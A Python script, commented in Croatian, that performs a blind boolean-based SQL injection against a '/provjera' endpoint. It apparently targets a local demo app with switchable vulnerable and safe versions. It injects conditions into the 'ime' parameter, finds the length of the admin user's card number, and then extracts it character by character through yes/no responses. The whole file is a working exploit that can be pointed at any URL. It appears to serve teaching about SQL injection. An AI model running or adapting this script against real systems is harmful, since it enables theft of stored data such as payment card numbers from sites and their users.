#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Slijepa (blind boolean-based) ekstrakcija preko /provjera endpointa.

Stranica /provjera odgovara samo ZAUZETO ili SLOBODNO i ne prikazuje nikakav
podatak iz baze. Ova skripta svejedno rekonstruira cijeli broj kartice
korisnika admin, znak po znak, postavljajuci nizu da/ne pitanja.

Pokretanje (dok app.py radi i verzija je RANJIVA):
    python blind_extract.py
ili s drugom adresom:
    python blind_extract.py http://127.0.0.1:8000
"""

import sys
import time
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
TRUE_MARK = "[[ORACLE:TRUE]]"        # skriveni marker, samo kad je uvjet istinit
CHARSET = "0123456789 "              # broj kartice: znamenke i razmak
SECRET = "(SELECT broj FROM kartice WHERE vlasnik='admin')"

_reqs = 0


def pitaj(uvjet):
    """Postavi jedno da/ne pitanje kroz injection i vrati True/False."""
    global _reqs
    ime = "admin' AND (%s) -- " % uvjet
    url = BASE + "/provjera?ime=" + urllib.parse.quote(ime, safe="")
    _reqs += 1
    with urllib.request.urlopen(url, timeout=5) as r:
        return TRUE_MARK in r.read().decode("utf-8", "replace")


def main():
    print("Meta: %s/provjera" % BASE)
    # provjeri da orakl uopce razlikuje istinu i laz
    if not pitaj("1=1") or pitaj("1=2"):
        print("Orakl ne razlikuje istinito i lazno pitanje.")
        print("Vjerojatno je verzija SIGURNA. Prebaci na RANJIVA i pokreni ponovno.")
        return

    print("Orakl radi (1=1 -> DA, 1=2 -> NE). Trazim duljinu tajnog broja...")
    duljina = None
    for n in range(1, 41):
        if pitaj("length(%s)=%d" % (SECRET, n)):
            duljina = n
            break
    if duljina is None:
        print("Nisam uspio odrediti duljinu.")
        return
    print("Duljina broja kartice: %d znakova.\n" % duljina)
    print("Ekstrakcija (samo da/ne odgovori, nijedan podatak nije prikazan):")

    nadjeno = ""
    t0 = time.time()
    for pos in range(1, duljina + 1):
        for c in CHARSET:
            if pitaj("substr(%s,%d,1)='%s'" % (SECRET, pos, c)):
                nadjeno += c
                break
        else:
            nadjeno += "?"
        sys.stdout.write("\r  ukradeno: %-20s" % nadjeno)
        sys.stdout.flush()
        time.sleep(0.03)

    dt = time.time() - t0
    print("\n")
    print("Broj kartice korisnika admin: %s" % nadjeno)
    print("Ukradeno u %d HTTP zahtjeva za %.1f sekundi." % (_reqs, dt))
    print("Stranica pritom nije prikazala nijedan podatak iz baze.")


if __name__ == "__main__":
    main()
